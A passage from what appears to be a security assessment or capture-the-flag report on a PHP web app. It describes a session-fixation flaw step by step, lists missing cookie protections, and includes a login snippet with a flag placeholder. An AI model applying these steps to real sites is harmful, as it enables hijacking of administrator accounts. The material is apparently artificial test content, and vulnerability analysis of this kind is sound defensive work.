    session_regenerate_id(true);  // ← Should regenerate session ID
    $_SESSION['admin_logged_in'] = true;
    echo "@FLAG@";
}
```

**Authorization Bypass Mechanism:**
1. Attacker creates session → gets predictable/known session ID
2. Attacker forces victim to use this session ID (URL param, cookie injection, MITM)
3. Victim authenticates successfully → server sets admin flag in attacker's session
4. Authorization check passes: `if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true)`
5. Attacker accesses admin resources using same session ID → inherits victim's privileges

**Additional Session Security Weaknesses:**
- **No HttpOnly flag:** Session cookie accessible via JavaScript (XSS can steal session via `document.cookie`)
- **No Secure flag:** Session transmitted over unencrypted HTTP (network sniffing possible)
- **No SameSite flag:** Vulnerable to CSRF attacks
- **No session timeout:** Admin sessions persist indefinitely

**Notes:**

- **Well-Documented Attack Pattern:** CWE-384 Session Fixation is recognized vulnerability class with known exploitation techniques
- **Victim Interaction Required:** Unlike AUTHZ-VULN-01, this attack requires tricking victim admin to authenticate
- **Social Engineering Dependency:** Success rate depends on attacker's ability to manipulate victim's session establishment
- **PHP Session Configuration:** Attack vectors may vary based on PHP settings (`session.use_only_cookies`, `session.use_strict_mode`)
- **Externally Exploitable:** Attack can be conducted from external internet position via http://localhost:51233, though requires victim cooperation
